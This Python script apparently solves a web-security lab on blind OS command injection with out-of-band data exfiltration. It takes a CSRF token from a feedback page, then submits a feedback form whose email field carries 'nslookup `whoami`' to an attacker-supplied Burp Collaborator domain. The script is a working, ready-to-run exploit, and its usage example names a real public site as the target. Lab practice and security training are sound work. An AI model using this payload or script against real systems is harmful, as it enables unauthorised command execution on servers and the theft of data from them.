#!/bin/env python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup 
from urllib.parse import urlparse
from colorama import init

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.2661.102 UBrowser/6.1.2107.204 Safari/537.36'}

def get_csrf_token(s, url):
	feedback_path = '/feedback'
	r = s.get(url + feedback_path, headers=header, verify=False)#, proxies=proxies)
	if (r.status_code == 200):
		suop = BeautifulSoup(r.text, 'html.parser')
		csrf = suop.find("input")['value']
		return csrf
	else:
		print("\033[1;31;40m[-] The lab url is invalid, please get it again.")
		sys.exit(-1)

def command_injection_dnslog(s, url, dnslog):
	submit_feedback_path = '/feedback/submit'
	payloads = "admin@gmail.com & nslookup `whoami`.{0} #".format(dnslog)
	csrf_token = get_csrf_token(s, url)
	data = {'csrf': csrf_token, 'name': 'admin', 'email': payloads, 'subject': 'admin', 'message': 'admin'}
	req = s.post(url + submit_feedback_path, data=data, headers=header, verify=False)#, proxies=proxies)
	print("\033[1;33;40m[+] Verifying if command injection exploit worked...")

	# verify comand injection
	if (req.status_code == 200 and len(req.text) <= 3):
		print("\033[1;32;40m[+] Blind OS command injection with out-of-band data exfiltration successful!")
		print("\033[1;32;40m[+] Go back to the Burp Collaborator client window poll now get result.")
	else:
		print("\033[1;31;40m[-] Blind OS command injection not successful.")
		print(req.text)

def main():
	if len(sys.argv) != 3:
		print("\033[36m[+] Usage: {0} <url> <burp collaborator domain>".format(sys.argv[0]))
		print("\033[36m[+] Example: {0} https://www.bing.com abcdf.oastify.com".format(sys.argv[0]))
		sys.exit(-1)

	# filter end of url /
	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname
	dnslog = sys.argv[2]

	print("\033[36m[+] Checking blind OS command injection with out-of-band data exfiltration...")

	s = requests.Session()
	command_injection_dnslog(s, url, dnslog)


if __name__ == "__main__":
	main()